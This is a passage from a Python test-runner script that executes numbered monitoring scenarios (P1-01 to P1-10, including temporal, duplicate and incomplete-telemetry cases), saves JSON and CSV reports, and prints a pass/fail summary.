    # P1-01 → P1-07
    # ============================================================

    for scenario in SCENARIOS:

        if scenario[
            "id"
        ] == "P1-10":

            continue


        print(
            f"\nRunning {scenario['id']}..."
        )


        result = (
            run_standard_scenario(
                monitor,
                scenario,
            )
        )


        results.append(
            result
        )


    # ============================================================
    # P1-08
    # ============================================================

    print(
        "\nRunning P1-08 temporal sequence..."
    )


    results.append(
        run_temporal_scenario(
            monitor
        )
    )


    # ============================================================
    # P1-09
    # ============================================================

    print(
        "\nRunning P1-09 duplicate test..."
    )


    results.append(
        run_duplicate_scenario(
            monitor
        )
    )


    # ============================================================
    # P1-10
    # ============================================================

    scenario_10 = next(

        scenario

        for scenario
        in SCENARIOS

        if scenario[
            "id"
        ] == "P1-10"
    )


    print(
        "\nRunning P1-10 incomplete telemetry..."
    )


    results.append(
        run_standard_scenario(
            monitor,
            scenario_10,
        )
    )


    # ============================================================
    # ORDER
    # ============================================================

    results.sort(
        key=lambda value:
            value[
                "scenario_id"
            ]
    )


    # ============================================================
    # REPORT
    # ============================================================

    (
        json_path,
        csv_path,
        summary_rows,
    ) = (
        save_reports(
            results
        )
    )


    print_matrix(
        summary_rows
    )


    print_failures(
        results
    )


    passed = sum(

        1

        for result
        in results

        if result.get(
            "passed"
        )
    )


    failed = (
        len(
            results
        )
        - passed
    )


    print(
        "\n"
        + "=" * 78
    )

    print(
        "FINAL SUMMARY"
    )

    print(
        "=" * 78
    )

    print(
        "Passed:",
        passed,
        "/",
        len(
            results
        )
    )

    print(
        "Failed:",
        failed,
        "/",
        len(
            results
        )
    )

    print(
        "JSON Report:",
        json_path
    )

    print(
        "CSV Report:",
        csv_path
    )

    print(
        "=" * 78
    )


if __name__ == "__main__":

    main()